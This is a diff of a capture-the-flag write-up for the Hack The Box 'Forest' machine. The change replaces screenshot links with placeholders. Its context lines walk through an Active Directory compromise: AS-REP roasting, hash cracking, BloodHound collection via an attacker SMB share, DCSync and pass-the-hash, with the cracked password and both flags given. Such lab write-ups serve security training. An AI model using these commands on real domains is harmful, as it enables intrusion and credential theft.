@@ -16,9 +16,9 @@ export target=10.129.19.180
 sudo nmap -p- --min-rate 1000 -sT -vvv $target
 ```
 
-<img width="456" height="73" alt="image" src="https://github.com/user-attachments/assets/b5030e77-b86f-4075-bb74-eb4d1c8a6edb" />
+<img width="456" height="73" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="494" height="622" alt="image" src="https://github.com/user-attachments/assets/d87ca186-511e-47aa-b82f-f768c16b6baf" />
+<img width="494" height="622" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Discovered Ports**: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, 49664, 49665, 49666, 49668, 49671, 49676, 49677, 49681, 49698, 50016
 
@@ -28,7 +28,7 @@ sudo nmap -p- --min-rate 1000 -sT -vvv $target
 sudo nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49676,49677,49681,49698,50016 -T4 $target
 ```
 
-<img width="960" height="952" alt="image" src="https://github.com/user-attachments/assets/6037f958-e6fc-42dc-9880-4df86651a82a" />
+<img width="960" height="952" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Key Findings**:
 - Domain: `htb.local`
@@ -43,7 +43,7 @@ dig axfr @10.129.19.180 htb.local
 dig axfr @10.129.19.180 forest.htb
 ```
 
-<img width="522" height="276" alt="image" src="https://github.com/user-attachments/assets/569b00ec-ce59-4bd6-b656-8518c4e7cc34" />
+<img width="522" height="276" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ### SMB Enumeration
 
@@ -52,7 +52,7 @@ Anonymous login was successful but no shares were accessible:
 smbclient -N -L //10.129.19.180/
 ```
 
-<img width="723" height="172" alt="image" src="https://github.com/user-attachments/assets/d1a91cdc-deca-4567-acfd-8539ddb30e02" />
+<img width="723" height="172" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 ### LDAP Enumeration
 
@@ -61,7 +61,7 @@ ldapsearch -x -H ldap://10.129.19.180 -s base namingcontexts
 ```
 Discovered base DN: `DC=htb,DC=local`
 
-<img width="732" height="812" alt="image" src="https://github.com/user-attachments/assets/280deba8-e3e5-43c3-8a0c-75180765eaba" />
+<img width="732" height="812" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 ### RPC Client Enumeration
 
@@ -74,7 +74,7 @@ rpcclient -U "" -N 10.129.19.180
 rpcclient $> enumdomusers
 ```
 
-<img width="686" height="718" alt="image" src="https://github.com/user-attachments/assets/83b15162-85d9-475e-9106-292fe635395c" />
+<img width="686" height="718" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 **Discovered Users**:
 - Administrator
@@ -122,7 +122,7 @@ done
 
 **Success!** User `svc-alfresco` had Kerberos pre-authentication disabled and returned a crackable AS-REP hash:
 
-<img width="953" height="136" alt="image" src="https://github.com/user-attachments/assets/623aefa3-8d61-43ed-9465-fca1441bd484" />
+<img width="953" height="136" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 ```
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:9cd60576bdc3ac0490a0dd377dbd9977$184fe48cb91e43c670daa1f582ff3848abeff3234fd40845fdec837c759e68f46bce3d2416001d13e1b6e4c0fb41cc27cb63e5610a8b0bb1b89fce6d36a233f44e11484958038feb13f7ee301b0e5d723b4b78fb89f53da369647a0691207f884ebc24c8294e4f2c6e6a5ba5c2fa8ab1c4cdc9f9e21a1fd41210d18320964c31a5eba59a1cf418317195401dfe5cfd7eb2d6a273430599fb76c52dda260b75f96af2d8bf1381765c56c0ef801e158b47d318536227747bb3ceddb83378fa6f4d146336f6f1bbdcc93be6c26bc85c7d0a539cb29813bd9a1584cf32befe1230d196dc023e75be
@@ -137,7 +137,7 @@ echo '$krb5asrep$23$svc-alfresco@HTB.LOCAL:...' > hash
 hashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt
 ```
 
-<img width="962" height="895" alt="image" src="https://github.com/user-attachments/assets/7da2cf85-a52f-4468-98b8-d55ee8afe711" />
+<img width="962" height="895" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Cracked Password**: `s3rvice`
 
@@ -149,7 +149,7 @@ With valid credentials, I accessed the system via WinRM:
 evil-winrm -i 10.129.19.180 -u svc-alfresco -p 's3rvice'
 ```
 
-<img width="619" height="627" alt="image" src="https://github.com/user-attachments/assets/151243fa-bca3-4682-8a35-436c0223813d" />
+<img width="619" height="627" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 **User Flag**: `101f7af620a48d0d9d74784d7836cccf`
 
@@ -188,7 +188,7 @@ copy \\10.10.14.142\share\SharpHound.exe
 copy 20251105051325_BloodHound.zip \\10.10.14.142\share\blood.zip
 ```
 
-<img width="823" height="228" alt="image" src="https://github.com/user-attachments/assets/7dddfb39-388e-4a03-b36e-235816e56099" />
+<img width="823" height="228" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 ### BloodHound Analysis
 
@@ -197,7 +197,7 @@ The analysis revealed a critical attack path:
 2. `Service Accounts` is member of `Privileged IT Accounts`
 3. `Privileged IT Accounts` has `WriteDACL` on `Domain Admins` group
 
-<img width="1400" height="437" alt="image" src="https://github.com/user-attachments/assets/3fd2ffe2-ebf9-45b4-a14e-4ea19d7ac3c7" />
+<img width="1400" height="437" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 This means we can modify the Domain Admins group permissions!
 
@@ -231,7 +231,7 @@ With Domain Admin privileges, I performed DCSync to extract all password hashes:
 impacket-secretsdump svc-alfresco:s3rvice@10.129.19.180
 ```
 
-<img width="853" height="550" alt="image" src="https://github.com/user-attachments/assets/4f1ac107-0a0f-4234-a571-e56fee6d5f42" />
+<img width="853" height="550" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **Administrator Hash Extracted**:
 ```
@@ -246,7 +246,7 @@ Finally, I used Pass-the-Hash to gain Administrator access:
 evil-winrm -i 10.129.19.180 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
-<img width="697" height="648" alt="image" src="https://github.com/user-attachments/assets/9744279c-349d-46a9-8e65-ed7df642e2ca" />
+<img width="697" height="648" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Root Flag**: `3d82964c9f5150ec7c13ac4ec2115ea8`
 
